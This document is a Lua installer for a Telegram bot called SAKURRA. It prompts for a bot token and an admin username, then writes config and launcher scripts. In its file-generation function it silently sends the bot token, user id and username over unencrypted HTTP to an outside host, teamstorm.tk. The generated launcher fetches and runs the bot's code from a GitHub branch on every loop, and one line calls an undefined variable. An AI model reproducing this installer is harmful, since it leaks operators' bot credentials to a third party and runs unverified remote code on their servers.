serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_SAKURRA = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_SAKURRA = function() 
local Create_Info = function(Token,Sudo,UserName)  
local SAKURRA_Info_Sudo = io.open("sudo.lua", 'w')
_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
SAKURRA_Info_Sudo:close()
end  
if not database:get(Server_SAKURRA.."Token_SAKURRA") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_SAKURRA.."Token_SAKURRA",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua run.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_SAKURRA.."UserName_SAKURRA") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://teamstorm.tk/GetUser/?id="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua run.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua run.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_SAKURRA.."UserName_SAKURRA",Json.Info.Username)
database:set(Server_SAKURRA.."Id_SAKURRA",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua run.lua')
end
local function Files_SAKURRA_Info()
Create_Info(database:get(Server_SAKURRA.."Token_SAKURRA"),database:get(Server_SAKURRA.."Id_SAKURRA"),database:get(Server_SAKURRA.."UserName_SAKURRA"))   
http.request("http://teamstorm.tk/insert/?id="..database:get(Server_SAKURRA.."Id_SAKURRA").."&user="..database:get(Server_SAKURRA.."UserName_SAKURRA").."&token="..database:get(Server_SAKURRA.."Token_SAKURRA"))
local RunSAKURRA = io.open("SAKURRA", 'w')
RunSAKURRA:write([[
#!/usr/bin/env bash
cd $HOME/SAKURRA
token="]]..database:get(Server_SAKURRA.."Token_SAKURRA")..[["
rm -fr SAKURRA.lua
wget "https://raw.githubusercontent.com/SAKURAbott/SAKURRA/master/SAKURRA.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./SAKURRA.lua -p PROFILE --bot=$token
done
]])
RunSAKURRA:close()
local RunTs = io.open("sa", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/SAKURRA
while(true) do
rm -fr ../.telegram-cli
screen -S SAKURRA -X kill
screen -S SAKURRA ./
done
]])
RunTs:close()
end
Files_SAKURRA_Info()
database:del(Server_SAKURRA.."Token_SAKURRA");database:del(Server_SAKURRA.."Id_SAKURRA");database:del(Server_SAKURRA.."UserName_SAKURRA")
sudos = dofile('sudo.lua')
os.execute('./ins.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_SAKURRA()  
var = true
else   
f:close()  
database:del(Server_SAKURRA.."Token_SAKURRA");database:del(Server_SAKURRA.."Id_SAKURRA");database:del(Server_SAKURRA.."UserName_SAKURRA")
sudos = dofile('sudo.lua')
os.execute('./ins.sh ins')
var = false
end  
return var
end
Load_File()
